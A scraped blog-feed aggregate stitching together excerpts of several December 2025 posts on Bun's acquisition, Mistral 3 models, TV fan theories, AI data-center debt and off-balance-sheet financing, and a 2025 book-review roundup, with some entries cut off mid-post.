<p>Instead of putting our users &amp; community through &quot;Bun, the VC-backed startups tries to figure out monetization&quot; – thanks to Anthropic, we can skip that chapter entirely and focus on building the best JavaScript tooling. [...] When people ask &quot;will Bun still be around in five or ten years?&quot;, answering with &quot;we raised $26 million&quot; isn't a great answer. [...]</p>
<p>Anthropic is investing in Bun as the infrastructure powering Claude Code, Claude Agent SDK, and future AI coding products. Our job is to make Bun the best place to build, run, and test AI-driven software — while continuing to be a great general-purpose JavaScript runtime, bundler, package manager, and test runner.</p>

      <h1>Introducing Mistral 3</h1>

(date: 2025-12-02)
      <p>
      <p><strong><a href="https://mistral.ai/news/mistral-3">Introducing Mistral 3</a></strong></p>
<p>Four new models from Mistral today: three in their &quot;Ministral&quot; smaller model series (14B, 8B, and 3B) and a new Mistral Large 3 MoE model with 675B parameters, 41B active.</p>
<p>All of the models are vision capable, and they are all released under an Apache 2 license.</p>
<p>I'm particularly excited about the 3B model, which appears to be a competent vision-capable model in a tiny ~3GB file.</p>
<p>Xenova from Hugging Face <a href="https://x.com/xenovacom/status/1995879338583945635">got it working in a browser</a>:</p>
<blockquote>
<p>@MistralAI releases Mistral 3, a family of multimodal models, including three start-of-the-art dense models (3B, 8B, and 14B) and Mistral Large 3 (675B, 41B active). All Apache 2.0! 🤗</p>
<p>Surprisingly, the 3B is small enough to run 100% locally in your browser on WebGPU! 🤯</p>
</blockquote>
<p>You can <a href="https://huggingface.co/spaces/mistralai/Ministral_3B_WebGPU">try that demo in your browser</a>, which will fetch 3GB of model and then stream from your webcam and let you run text prompts against what the model is seeing, entirely locally.</p>
<p><img src="https://static.simonwillison.net/static/2025/3b-webcam.jpg" alt="Screenshot of a man with glasses holding a red cube-shaped object up to the camera in a live computer vision interface; top left label reads “LIVE FEED”; top right slider label reads “INPUT SIZE: 480PX”; lower left panel titled “PROMPT LIBRARY” with prompts “Describe what you see in one sentence.” “What is the color of my shirt?” “Identify any text or written content visible.” “What emotions or actions are being portrayed?” “Name the object I am holding in my hand.”; below that a field labeled “PROMPT” containing the text “write a haiku about this”; lower right panel titled “OUTPUT STREAM” with buttons “VIEW HISTORY” and “LIVE INFERENCE” and generated text “Red cube held tight, Fingers frame the light’s soft glow– Mystery shines bright.”; a small status bar at the bottom shows “ttft: 4188ms  tokens/sec: 5.09” and “ctx: 3.3B-Instruct”."></p>
<p>Mistral's API hosted versions of the new models are supported by my <a href="https://github.com/simonw/llm-mistral">llm-mistral plugin</a> already thanks to the <code>llm mistral refresh</code> command:</p>
<pre><code>$ llm mistral refresh
Added models: ministral-3b-2512, ministral-14b-latest, mistral-large-2512, ministral-14b-2512, ministral-8b-2512

</code></pre>
<p>I <a href="https://gist.github.com/simonw/0df5e656291d5a7a1bf012fabc9edc3f">tried pelicans against all of the models</a>. Here's the best one, from Mistral Large 3:</p>
<p><img src="https://static.simonwillison.net/static/2025/mistral-large-3.png" alt="Nice cloud. Pelican isn't great, the beak is missing the pouch. It's floating above the bicycle which has two wheels and an incorrect frame."></p>
<p>And the worst from Ministral 3B:</p>

      <p>
      <p>Theories on what's actually going on.</p>
<ul>
<li>It's a love story between Carol and Zosia. You <em>can</em> fall in love with a person with no sense of self. They plotted to have Helen killed, and waited until Carol's &quot;f*ckable&quot; judgment turns into real love. They get married and everyone lives happily ever after.</li>
<li>Alternate theory -- the original people are still in their bodies, suppressed to keep quiet. Inside they're screaming to be saved, as pissed off as Carol. They want their bodies back. They have the ability to write messages on their skin, so what Carol saw at the end of the last episode was a corpse with the words HELP ME! visible on the body's belly.</li>
<li>Another alternate theory about the end of the last episode -- it took a moment for Carol to recognize her own body, possibly dead, and realizing this is all a dream. It's another version of <a href="https://daytona.scripting.com/search?q=%22the%20matrix%22">The Matrix</a>, where this is the fake reality that we've been seeing. None of this is really happening.

      <p>Senator Everett Dirksen is famously alleged to have remarked &quot; <a href="https://www.dirksencenter.org/research-collections/everett-m-dirksen/dirksen-record/billion-here-billion-there">a billion here, a billion there, pretty soon you're talking real money</a>&quot;.</p>

Oracle is talking real money; they're borrowing $1.64B each working day. Mr. Market is skeptical that the real money is going to be repaid, as Caleb Mutua reports in <a href="https://www.bloomberg.com/news/articles/2025-11-26/morgan-stanley-warns-oracle-credit-protection-nearing-record-high"><em>Morgan Stanley Warns Oracle Credit Protection Nearing Record High</em></a>:</p>
<blockquote>
<p>A gauge of risk on Oracle Corp.’s (ORCL) debt reached a three-year high in November, and things are only going to get worse in 2026 unless the database giant is able to assuage investor anxiety about a massive artificial intelligence spending spree, according to Morgan Stanley.</p>
<p>A funding gap, swelling balance sheet and obsolescence risk are just some of the hazards Oracle is facing, according to Lindsay Tyler and David Hamburger, credit analysts at the brokerage. The cost of insuring Oracle Corp.’s debt against default over the next five years rose to 1.25 percentage point a year on Tuesday, according to ICE Data Services.</p>

But notice that only $18B of this debt appears on Oracle's balance sheet. Despite that, their credit default swaps spiked and the stock dropped 29% in the last month.</p>
<p>Below the fold I look into why Oracle and other hyperscalers desperate efforts to keep the vast sums they're borrowing off their books aren't working.</p>
<p>Part of the reason the market is unhappy started in mid-September with <em>The Economist</em>'s <a href="https://www.economist.com/business/2025/09/18/the-4trn-accounting-puzzle-at-the-heart-of-the-ai-cloud"><em>The $4trn accounting puzzle at the heart of the AI cloud</em></a>. It raised the issue that I covered in <a href="https://blog.dshr.org/2025/10/depreciation.html"><em>Depreciation</em></a>, that the hardware that represents about 60% of the cost of a new AI data center doesn't last long. It took a while for the financial press to focus on the issuea, but now they have.</p>
<p>The most recent one I've seen was triggered by the <a href="https://www.bloomberg.com/news/articles/2025-11-28/cme-data-center-with-cooling-issue-was-flagship-site-in-aurora">outage at the CME</a> (caused by overheating in Chicago in November!). In <a href="https://www.bloomberg.com/news/newsletters/2025-11-28/ai-can-cook-the-entire-market-now"><em>AI Can Cook the Entire Market Now</em></a> Tracy Alloway posted part of the transcript of an <a href="https://www.youtube.com/watch?v=z4ct_eDYx2A">Odd Lots podcast</a> with Paul Kedrosky pointing out a reason I didn't cover why the GPUs in AI data centers depreciate quickly:</p>
<blockquote>
<p>When you run using the latest, say, an Nvidia chip for training a model, those things are being run flat out, 24 hours a day, seven days a week, which is why they're liquid-cooled, they're inside of these giant centers where one of your primary problems is keeping them all cool. It's like saying ‘I bought a used car and I don't care what it was used for.’ Well, if it turns out it was used by someone who was doing like Le Mans 24 hours of endurance with it, that's very different even if the mileage is the same as someone who only drove to church on Sundays.</p>
<p>These are very different consequences with respect to what's called the thermal degradation of the chip. The chip's been run hot and flat out, so probably its useful lifespan might be on the order of two years, maybe even 18 months. There's a huge difference in terms of how the chip was used, leaving aside whether or not there's a new generation of what's come along. So it takes us back to these depreciation schedules.</p>
</blockquote>
<p>There was a similar problem <a href="https://davidgerard.co.uk/blockchain/2022/09/29/crypto-collapse-states-bust-nexo-terras-do-kwon-on-the-run-celsius-ceo-resigns-ftx-buying-voyager-and-eyeing-celsius-eth-miners-screwed/">after the Ethereum merge</a>:</p>
<blockquote>
<p>73% of Ethereum miners have just given up: “About 10.6 million RTX 3070 equivalents have stopped mining since the merge.”</p>
<p>We strongly recommend that you do not hit eBay for a cheap video card, despite the listings reassuring you that this card was only used by a little old lady to play Minecraft on Sundays and totally not for crypto mining, and that you should ignore the burnt odor and the charred RAM. Unless you’re poor, and the card’s so incredibly cheap that you’re willing to play NVidia Roulette.</p>
<p>How well do miners treat their precious babies? “GPU crypto miners in Vietnam appear to be jet washing their old mining kit before putting the components up for sale.” There are real cleaning methods that involve doing something like this with liquid fluorocarbons — but the crypto miners seem to be using just water.</p>
</blockquote>
<p>But this depreciation problem is only one part of why the market is skeptical of the hyperscalers technique for financing their AI data centers. The technique is called Conduit Debt Financing, and Les Barclays' <a href="https://lesbarclays.substack.com/p/the-mechanics-of-conduit-debt-financing"><em>Unpacking the Mechanics of Conduit Debt Financing</em></a> provides an accessible explanation of how it works:</p>
<blockquote>
<p>Conduit debt financing is a structure where an intermediary entity (the “conduit”) issues debt securities to investors and passes the proceeds through to an end borrower. The key feature distinguishing conduit debt from regular corporate bonds is that the conduit issuer has no substantial operations or assets beyond the financing transaction itself. The conduit is purely a pass-through vehicle, the debt repayment relies entirely on revenues or assets from the ultimate borrower.</p>
<p>Think of it this way: Company A wants to borrow money but doesn’t want that debt appearing on its balance sheet or affecting its credit rating. So it works with a conduit entity, Company B, which issues bonds to investors. Company B takes that capital and uses it to build infrastructure or acquire assets that Company A needs. Company A then enters into long-term lease or service agreements with Company B, and those payments service the debt. On paper, Company A is just a customer making payments, not a debtor owing bondholders.</p>
<p>The structure creates separation. The conduit issuer’s creditworthiness depends on the revenue stream from the end user, not on the conduit’s own balance sheet (because there isn’t really one). This is why conduit debt is often referred to as “pass-through” financing, the economics flow through the conduit structure to reach the underlying obligor.</p>
</blockquote>
<p>The article continues to examine Meta's deal in great detail, and notes some of the <a href="https://lesbarclays.substack.com/p/the-mechanics-of-conduit-debt-financing">legal risks of this technique</a>:</p>
<blockquote>
<p><strong>Legal risks when things break:</strong> Substantive consolidation (court merges conduit with sponsor), recharacterization (lease treated as secured financing), and fraudulent transfer challenges. The structures haven’t been stress-tested yet because hyperscalers are wildly profitable. But if AI monetization disappoints or custom silicon undercuts demand, we’ll discover whether bondholders have secured claims on essential infrastructure or are functionally unsecured creditors of overleveraged single-purpose entities.</p>
</blockquote>
<p>The article asks the <a href="https://lesbarclays.substack.com/p/the-mechanics-of-conduit-debt-financing">big question</a>:</p>
<blockquote>
<p>Why would Meta finance this via the project finance markets? And why does it cost $6.5 billion more?</p>
<p>That’s how much more Meta is paying to finance this new AI data center using the project finance market versus what they could have paid had they used traditional corporate debt. So why on earth is this being called a win? And even crazier, why are other AI giants like Oracle and xAI looking to copy it?</p>
</blockquote>
<p>The $6.5B is the total of the 1% extra interest above Meta's corporate bond rate over the 20 years.</p>

If Counduit Debt Financing is a standard tool of project finance, why is Mr. Market unhappy with the hyperscalers' use of it? Jonathan Weil's somewhat less detailed look at Meta's $27B deal in <a href="https://www.msn.com/en-us/money/other/ai-meets-aggressive-accounting-at-meta-s-gigantic-new-data-center/ar-AA1R26qj"><em>AI Meets Aggressive Accounting at Meta’s Gigantic New Data Center</em></a> reveals how they are pushing the envelope of GAAP (Generally Accepted Accounting Principles):</p>
<blockquote>
<p>Construction on the project was well under way when Meta announced a new financing deal last month. Meta moved the project, called Hyperion, off its books into a new joint venture with investment manager Blue Owl Capital. Meta owns 20%, and funds managed by Blue Owl own the other 80%. Last month, a holding company called Beignet Investor, which owns the Blue Owl portion, sold a then-record $27.3 billion of bonds to investors, mostly to Pimco.</p>
<p>Meta said it won’t be consolidating the joint venture, meaning the venture’s assets and liabilities will remain off Meta’s balance sheet. Instead Meta will rent the data center for as long as 20 years, beginning in 2029. But it will start with a four-year lease term, with options to renew every four years.</p>
<p>This lease structure minimizes the lease liabilities and related assets Meta will recognize, and enables Meta to use “operating lease,” rather than “finance lease,” treatment. If Meta used the latter, it would look more like Meta owns the asset and is financing it with debt.</p>
</blockquote>
<p>Under GAAP, when would Meta be required to treat it as a <a href="https://www.msn.com/en-us/money/other/ai-meets-aggressive-accounting-at-meta-s-gigantic-new-data-center/ar-AA1R26qj">finance lease</a>?</p>
<blockquote>
<p>The joint venture is what is known in accounting parlance as a variable interest entity, or VIE for short. That term means the ownership doesn’t necessarily reflect which company controls it or has the most economic exposure. If Meta is the venture’s “primary beneficiary”—which is another accounting term of art—Meta is required to consolidate it.</p>
<p>Under the accounting rules, Meta is the primary beneficiary if two things are true. First, it must have “the power to direct the activities that most significantly impact the VIE’s economic performance.” Second, it must have the obligation to absorb significant losses of the VIE, or the right to receive significant benefits from it.</p>
</blockquote>
<p>Does Meta have <a href="https://www.msn.com/en-us/money/other/ai-meets-aggressive-accounting-at-meta-s-gigantic-new-data-center/ar-AA1R26qj">“the power to direct the activities&quot;</a> at the data center it will operate?:</p>
<blockquote>
<p>Blue Owl has control over the venture’s board. But voting rights and legal form aren’t determinative for these purposes. What counts under the accounting rules is Meta’s substantive power and economic influence. Meta in its disclosures said “we do not direct the activities that most significantly impact the venture’s economic performance.” But the test under the accounting rules is whether Meta has the power to do so.</p>
</blockquote>
<p>Does Meta receive &quot;significant benefits&quot;? Is it required to <a href="https://www.msn.com/en-us/money/other/ai-meets-aggressive-accounting-at-meta-s-gigantic-new-data-center/ar-AA1R26qj">&quot;absorb losses&quot;</a>?:</p>
<blockquote>
<p>The second test—whether Meta has skin in the game economically—has an even clearer answer. Meta has operational control over the data center and its construction. It bears the risks of cost overruns and construction delays. Meta also has provided what is called a residual-value guarantee to cover bondholders for the full amount owed if Meta doesn’t renew its lease or terminates early.</p>
</blockquote>
<p>The lease is notionally for 20 years but Meta can get out every four years. Is Meta likely to terminate early? In other words, how likely in 2041 is Meta to need an enormous 16-year old data center? Assuming that the hardware has an economic life of 2 years, the kit representing about 60% of the initial cost would be 8 generations behind the state of the art. In fact 60% of the cost is likely to be obsolete by the <em>first</em> renewal deadline, even if we assume Nvidia won't actually be on the one-year cadence it has announced.</p>
<p>But what about the other 40%? It has a longer life, but not that long. The reason everyone builds new data centers is that the older ones can't deliver the power and cooling current Nvidia systems need. <a href="https://www.technologyreview.com/2025/03/26/1113802/china-ai-data-centers-unused/">80% of recent data centers in China</a> are empty because they were built for old systems.</p>
<p>But the new ones will be <a href="https://www.theregister.com/2025/11/15/power_supercomputing/">obsolete soon</a>:</p>
<blockquote>
<p>Today, Nvidia's rack systems are hovering around 140kW in compute capacity. But we've yet to reach a limit. By 2027, Nvidia plans to launch 600kW racks which pack 576 GPU dies into the space one occupied by just 32.</p>
</blockquote>
<p>Current data centers won't handle these systems - indeed how to build data centers that do is a <a href="https://www.theregister.com/2025/11/15/power_supercomputing/">research problem</a>:</p>
<blockquote>
<p>To get ahead of this trend toward denser AI deployments, Digital Realty announced a research center in collaboration with Nvidia in October.</p>
<p>The facility, located in Manassas, Virginia, aims to develop a new kind of datacenter, which Nvidia CEO Jensen Haung has taken to calling AI factories, that consumes power and churn out tokens in return.</p>
</blockquote>
<p>If the design of data centers for Nvidia's 2027 systems is only now being researched, how likely is it that Meta will renew the lease on a data center built for Nvidia's 2025 systems in 2041? So while the risk that Meta will terminate the lease in 2029 is low, termination before 2041 is certain. And thus so are residual-value guarantee payments.</p>
<p>How does the risk of non-renewal play out <a href="https://www.msn.com/en-us/money/other/ai-meets-aggressive-accounting-at-meta-s-gigantic-new-data-center/ar-AA1R26qj">under GAAP</a>?</p>
<blockquote>
<p>Another judgment call: Under the accounting rules, Meta would have to include the residual-value guarantee in its lease liabilities if the payments owed are “probable.” That could be in tension with Meta’s assumption that the lease renewal isn’t “reasonably certain.”</p>
<p>If renewal is uncertain, the guarantee is more likely to be triggered. But if the guarantee is triggered, Meta would have to recognize the liability.</p>
</blockquote>
<p>Weil sums it up <a href="https://www.msn.com/en-us/money/other/ai-meets-aggressive-accounting-at-meta-s-gigantic-new-data-center/ar-AA1R26qj">concisely</a>:</p>
<blockquote>
<p>Ultimately, the fact pattern Meta relies on to meet its conflicting objectives strains credibility. To believe Meta’s books, one must accept that Meta lacks the power to call the shots that matter most, that there’s reasonable doubt it will stay beyond four years, and that it probably won’t have to honor its guarantee—all at the same time.</p>

These accounting shenanigans explain why Sam Altman said the queit part out loud recently and then had to walk it back. Jose Antonio Lanz reports this in <a href="https://decrypt.co/347866/openai-sought-government-loan-guarantees-sam-altman-denial"><em>OpenAI Sought Government Loan Guarantees Days Before Sam Altman's Denial</em></a> (my emphasis):</p>
<blockquote>
<p>OpenAI explicitly requested federal loan guarantees for AI infrastructure in an October 27 letter to the White House—which kindly refused the offer, with AI czar David Sacks <a href="https://x.com/DavidSacks/status/1986476840207122440?s=20">saying</a> that at least 5 other companies could take OpenAI’s place—directly contradicting CEO Sam Altman's public statements claiming the company doesn't want government support.</p>
<p>The 11-page letter, submitted to the <a href="https://cdn.openai.com/pdf/21b88bb5-10a3-4566-919d-f9a6b9c3e632/openai-ostp-rfi-oct-27-2025.pdf">Office of Science and Technology Policy</a>, called for expanding tax credits and deploying &quot;grants, cost-sharing agreements, <strong>loans, or loan guarantees</strong> to expand industrial base capacity&quot; for AI data centers and grid components. The letter detailed how &quot;direct funding could also help shorten lead times for critical grid components—transformers, HVDC converters, switchgear, and cables—from years to months.&quot;</p>
</blockquote>
<p>After this PR <em>faux pas</em> some less obvious way taxpayer dollars could keep the AI bubble inflating had to be found. Just over two weeks later Thomas Beaumont reported that <a href="https://apnews.com/article/genesis-mission-trump-ai-25acaea44113c2b60111e8b142344737"><em>Trump signs executive order for AI project called Genesis Mission to boost scientific discoveries</em></a>:</p>
<blockquote>
<p>Trump unveiled the “Genesis Mission” as part of an executive order he signed Monday that directs the Department of Energy and national labs to build a digital platform to concentrate the nation’s scientific data in one place.</p>
<p>It solicits private sector and university partners to use their AI capability to help the government solve engineering, energy and national security problems, including streamlining the nation’s electric grid, according to White House officials who spoke to reporters on condition of anonymity to describe the order before it was signed.</p>
</blockquote>
<p>This appears to be a project of David Sacks, the White House AI advisor and a prominent member of the &quot;PayPal Mafia&quot;. Sacks was the subject of a massive, 5-author <em>New York Times</em> profile entitled <a href="https://www.nytimes.com/2025/11/30/technology/david-sacks-white-house-profits.html"><em>Silicon Valley’s Man in the White House Is Benefiting Himself and His Friends</em></a>:</p>

<li>Mr. Sacks has recommended A.I. policies that have sometimes run counter to national security recommendations, alarming some of his White House colleagues and raising questions about his priorities.</li>

<blockquote>
<p><em>“The way this works”, said an investor friend to me this morning: “is that when Nvidia is about to miss their quarter, Jen Hsun calls David Sacks, who then gets this government initiative to place a giant order for chips that go into a warehouse.”</em></p>
<p>I obviously can’t confirm or deny that actually happened. My friend might or might not have been kidding. But either way the White House’s new Science and AI program, Genesis, announced by Executive Order on Monday, does seem to involve the government buying a lot of chips from a lot of AI companies, many of which are losing money.</p>
<p>And David Sack’s turnaround from “read my lips, no AI bailout” (November 6) to “we can’t afford to [let this all crash]” tweet (November 24) came just hours before the Genesis announcement.</p>
</blockquote>
<p>I think the six companies Sacks was talking about are divided into two groups:</p>
<ul>
<li>OpenAI, Anthropic and xAI, none of whom have a viable business model.</li>
<li>Meta, Google and Microsoft, all of whom are pouring the cash from their viable business models into this non-viable business,</li>
</ul>
<p>This is the reason why the hyperscalers are taking desperate financial measures. They are driven by FOMO but they all see the probability that the debt won't be paid back. Where is the revenue to pay them back going to come from? It isn't going to come from consumers, because edge inference is good enough for almost all consumers (which is why 92% of OpenAI's customers pay $0). It isn't going to come from companies laying off hordes of low-paid workers, because they're low-paid.</p>
<p>So before they need to replace the 60% of the loan's value with the next generation of hardware in 2027 they need to find enterprise generative AI applications that are so wildly profitable for their customers that they will pay enough over the cost of running the applications to cover not just the payments on the loans but also another 30% of the loan <em>value</em> every year. For Meta alone this is around $30B a year!</p>
<p>And they need to be aware that the Chinese are going to kill their margins. Thanks to their massive investments in the &quot;hoax&quot; of renewable energy, power is so much cheaper in China that systems built with their less efficient chips are cost-competitive with Nvida's in operation. Not to mention that the Chinese chip makers operate on much lower margins than Nvidia. Nvidia's chips will get better, and so will the Chinese chips. But power in the US will get more expensive, in part <em>because</em> of the AI buildout, and in China it will get cheaper.</p>
<p>This won't end well</p>

      <h1>Pluralistic: All the books I reviewed in 2025 (02 Dec 2025)</h1>

(date: 2025-12-02)
      <p>
      <p>Today's links All the books I reviewed in 2025: A year in books. Hey look at this: Delights to delectate. Object permanence: David Byrne v RIAA; Sam Buck vs Starbucks; Eek-A-Trad; Mesopotamian DRM; Distanced stage plays. Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. All the books I reviewed in 2025 (permalink) I read as much as I could in 2025, but as ever, I have finished the year bitterly aware of how many wonderful books I didn't get to, whose spines glare daggers at me whenever I sit down at my desk, beneath my groaning To Be Read shelf. But I did write nearly two dozen reviews here on Pluralistic in calendar 2025, which I round up below. If these aren't enough for you, please check out the lists from previous years. 2024: <a href="https://pluralistic.net/2024/12/02/booklish/#2024-in-review">https://pluralistic.net/2024/12/02/booklish/#2024-in-review</a> 2023: <a href="https://pluralistic.net/2023/12/01/bookmaker/#2023-in-review">https://pluralistic.net/2023/12/01/bookmaker/#2023-in-review</a> 2022: <a href="https://pluralistic.net/2022/12/01/bookishness/#2022-in-review">https://pluralistic.net/2022/12/01/bookishness/#2022-in-review</a> 2021: <a href="https://pluralistic.net/2021/12/08/required-ish-reading/#bibliography">https://pluralistic.net/2021/12/08/required-ish-reading/#bibliography</a> 2020: <a href="https://pluralistic.net/2020/12/08/required-reading/#recommended-reading">https://pluralistic.net/2020/12/08/required-reading/#recommended-reading</a> Now that my daughter is off at college (!), I have a lot fewer kids' books in my life than I did when she was growing up. I miss 'em! (And I miss her, too, obviously). But! I did manage to read a couple great kids' books this year that I recommend to you without reservation, both for your own pleasure and for any kids in your life, and I wanted to call them out separately, since (good) books are such good gifts for kids: Daniel Pinkwater's Jules, Penny and the Rooster (middle-grades novel) <a href="https://pluralistic.net/2025/03/11/klong-you-are-a-pickle-2/#martian-space-potato">https://pluralistic.net/2025/03/11/klong-you-are-a-pickle-2/#martian-space-potato</a> Perry Metzger, Penelope Spector and Jerel Dye's Science Comics Computers: How Digital Hardware Works (graphic novel nonfiction) <a href="https://pluralistic.net/2025/11/05/xor-xand-xnor-nand-nor/#brawniac">https://pluralistic.net/2025/11/05/xor-xand-xnor-nand-nor/#brawniac</a> NONFICTION I. Cooking in Maximum Security, Matteo Guidi Cooking in Maximum Security is a slim volume of prisoners' recipes and improvised cooking equipment, a testament to the ingenuity of a network of prisoners in Italy's maximum security prisons. <a href="https://pluralistic.net/2025/11/24/moca-moka/#culinary-apollo-13">https://pluralistic.net/2025/11/24/moca-moka/#culinary-apollo-13</a> II. 9 Times My Work Has Been Ripped Off, Raymond Biesinger A masterclass in how creative workers can transform the endless, low-grade seething about the endless ripoffs of the industry into something productive and even profound. <a href="https://pluralistic.net/2025/10/28/productive-seething/#fuck-you-pay-me">https://pluralistic.net/2025/10/28/productive-seething/#fuck-you-pay-me</a> III. Three Rocks, Bill Griffiths What better format for a biography of Ernie Bushmiller, creator of the daily Nancy strip, than a graphic novel? And who better to write and draw it than Bill Griffith, creator of Zippy the Pinhead, a long-running and famously surreal daily strip? Griffith is carrying on the work of Scott McCloud, whose definitive Understanding Comics used the graphic novel form to explain the significance and method of sequential art, singling out Nancy for special praise. <a href="https://pluralistic.net/2025/06/27/the-snapper/#9-to-107-spikes">https://pluralistic.net/2025/06/27/the-snapper/#9-to-107-spikes</a> IV. The Blues Brothers, Daniel de Visé A brilliantly told, brilliantly researched tale that left me with a much deeper understanding of – and appreciation for – the cultural phenomenon that I was (and am) swept up in. <a href="https://pluralistic.net/2025/06/21/1060-west-addison/#the-new-oldsmobiles-are-in-early-this-year">https://pluralistic.net/2025/06/21/1060-west-addison/#the-new-oldsmobiles-are-in-early-this-year</a> V. Close to the Machine, Ellen Ullman Ullman's subtitle for the book is &quot;Technophilia and its discontents,&quot; and therein lies the secret to its magic. Ullman loves programming computers, loves the way they engage her attention, her consciousness, and her intelligence. Her descriptions of the process of writing code – of tackling a big coding project – are nothing less than revelatory. She captures something that a million technothriller movies consistently fail to even approach: the dramatic interior experience of a programmer who breaks down a complex problem into many interlocking systems, the momentary and elusive sense of having all those systems simultaneously operating in a high-fidelity mental model, the sense of being full, your brain totally engaged in every way. It's a poetics of language that meets and exceeds the high bar set by the few fiction writers who've ever approached a decent rendering of this feeling, like William Gibson. <a href="https://pluralistic.net/2025/07/16/beautiful-code/#hackers-disease">https://pluralistic.net/2025/07/16/beautiful-code/#hackers-disease</a> VI. Chasing Shadows, Ron Deibert Deibert's pulse-pounding, sphinter-tightening true memoir of his battles with the highly secretive cyber arms industry whose billionaire owners provide mercenary spyware that's used by torturers, murderers and criminals to terrorize their victims. <a href="https://pluralistic.net/2025/02/04/citizen-lab/#nso-group">https://pluralistic.net/2025/02/04/citizen-lab/#nso-group</a> VII. Little Bosses Everywhere, Bridget Read Read, an investigative journalist at Curbed, takes us through the history of the multi-level marketing &quot;industry,&quot; which evolved out of Depression-era snake oil salesmen, Tupperware parties, and magical thinking cults built around books like Think and Grow Rich. This fetid swamp gives rise to a group of self-mythologizing scam artists who founded companies like Amway and Mary Kay, claiming outlandish – and easily debunked – origin stories that the credulous press repeats, alongside their equally nonsensical claims about the &quot;opportunities&quot; they are creating for their victims. <a href="https://pluralistic.net/2025/05/05/free-enterprise-system/#amway-or-the-highway">https://pluralistic.net/2025/05/05/free-enterprise-system/#amway-or-the-highway</a> VIII. Careless People, Sarah Wynn-Williams Wynn-Williams was a lot closer to three of the key personalities in Facebook's upper echelon than anyone in my orbit: Mark Zuckerberg, Sheryl Sandberg, and Joel Kaplan, who was elevated to VP of Global Policy after the Trump II election. I already harbor an atavistic loathing of these three based on their public statements and conduct, but the events Wynn-Williams reveals from their private lives make them out to be beyond despicable. There's Zuck, whose underlings let him win at board-games like Settlers of Catan because he's a manbaby who can't lose (and who accuses Wynn-Williams of cheating when she fails to throw a game of Ticket to Ride while they're flying in his private jet). There's Sandberg, who demands the right to buy a kidney for her child from someone in Mexico, should that child ever need a kidney. <a href="https://pluralistic.net/2025/04/23/zuckerstreisand/#zdgaf">https://pluralistic.net/2025/04/23/zuckerstreisand/#zdgaf</a> IX. More Everything Forever, Adam Becker Astrophysicist Adam Becker knows a few things about science and technology – enough to show, in a new book called More Everything Forever that the claims that tech bros make about near-future space colonies, brain uploading, and other skiffy subjects are all nonsense dressed up as prediction. <a href="https://pluralistic.net/2025/04/22/vinges-bastards/#cyberpunk-is-a-warning-not-a-suggestion">https://pluralistic.net/2025/04/22/vinges-bastards/#cyberpunk-is-a-warning-not-a-suggestion</a> X. Murder the Truth, David Enrich A brave, furious book about the long-running plan by America's wealthy and corrupt to &quot;open up the libel laws&quot; so they can destroy their critics. In taking on the libel-industrial complex – a network of shadowy, thin-skinned, wealthy litigation funders; crank academics; buck-chasing lawyer lickspittle sociopaths; and the most corrupt Supreme Court justice on the bench today – Enrich is wading into dangerous territory. After all, he's reporting on people who've made it their life's mission to financially destroy anyone who has the temerity to report on their misdeeds. <a href="https://pluralistic.net/2025/03/17/actual-malice/#happy-slapping">https://pluralistic.net/2025/03/17/actual-malice/#happy-slapping</a> FICTION I. Letters From an Imaginary Country, Theodora Goss Goss spins extremely weird, delightful and fun scenarios in these stories and she slides you into them like they were a warm bath. Before you know it, you're up to your nostrils in story, the water filling your ears, and you don't even remember getting in the tub. They're that good. Goss has got a pretty erudite and varied life-history to draw on here. She's a Harvard-trained lawyer who was born in Soviet Hungary, raised across Europe and the UK and now lives in the USA. She's got a PhD in English Lit specializing in gothic literature and monsters and was the research assistant on a definitive academic edition of Dracula. Unsurprisingly, she often writes herself into her stories as a character. <a href="https://pluralistic.net/2025/11/11/athena-club/#incluing">https://pluralistic.net/2025/11/11/athena-club/#incluing</a> II. The Immortal Choir Holds Every Voice, Margaret Killjoy A collection of three linked short stories set in Killjoy's celebrated Danielle Cain series, which Alan Moore called &quot;ideal reading for a post-truth world. Danielle Cain is a freight-train-hopping, anarcho-queer hero whose adventures are shared by solidaristic crews of spellcasting, cryptid-battling crustypunk freaks and street-fighters. <a href="https://pluralistic.net/2025/06/18/anarcho-cryptid/#decameron-and-on">https://pluralistic.net/2025/06/18/anarcho-cryptid/#decameron-and-on</a> III. Fever Beach, Carl Hiaasen Hiaasen's method is diabolical and hilarious: each volume introduces a bewildering cast of odd, crooked, charming, and/or loathsome Floridians drawn from his long experience chronicling the state and its misadventures. After 20-some volumes in this vein (including Bad Monkey, lately adapted for Apple TV), something far weirder than anything Hiaasen ever dreamed up came to pass: Donald Trump, the most Florida Man ever, was elected president. If you asked an LLM to write a Hiaasen novel, you might get Trump: a hacky, unimaginative version of the wealthy, callous, scheming grifters of the Hiaasenverse. Back in 2020, Hiaasen wrote Trump into Squeeze Me, a tremendous and madcap addition to his canon. Fever Beach is the first Hiaasen novel since Squeeze Me, and boy, does Hiaasen ever have MAGA's number. It's screamingly funny, devilishly inventive, and deeply, profoundly satisfying. With Fever Beach, Hiaasen makes a compelling case for Florida as the perfect microcosm of the terrifying state of America, and an even more compelling case for his position as its supreme storyteller. <a href="https://pluralistic.net/2025/10/21/florida-duh/#strokerz-for-liberty">https://pluralistic.net/2025/10/21/florida-duh/#strokerz-for-liberty</a> IV. Jules, Penny and the Rooster, Daniel Pinkwater Jules and her family have just moved to a suburb called Bayberry Acres in the sleepy dormitory city of Turtle Neck and now she's having a pretty rotten summer. All that changes when Jules enters an essay contest in the local newspaper to win a collie (a contest she enters without telling her parents, natch) and wins. Jules names the collie Penny, and they go for long rambles in the mysterious woods that Bayberry Acres were carved out of. It's on one of these walks that they meet the rooster, a handsome, proud, friendly fellow who lures Penny over the stone wall that demarcates the property line ringing the spooky, abandoned mansion/castle at the center of the woods. Jules chases Penny over the wall, and that's when everything changes. On the other side of that wall is a faun, and little leprechaun-looking guys, and a witch (who turns out to be a high-school chum of her city-dwelling, super-cool aunt), and there's a beast in a hidden dilapidated castle. After Jules sternly informs the beast that she's far too young to be anyone's girlfriend – not even a potentially enchanted prince living as a beast in a hidden castle – he disabuses her of this notion and tells her that she is definitely the long-prophesied savior of the woods, whose magic has been leaking out over years. Nominally this is a middle-grades book, and while it will certainly delight the kids in your life, I ate it up. The purest expression of Pinkwater's unique ability to blend the absurd and the human and make the fantastic normal and the normal fantastic. I laughed long and hard, and turned the final page with that unmissable Pinkwatertovian sense of satisfied wonder. <a href="https://pluralistic.net/2025/03/11/klong-you-are-a-pickle-2/#martian-space-potato">https://pluralistic.net/2025/03/11/klong-you-are-a-pickle-2/#martian-space-potato</a> V. 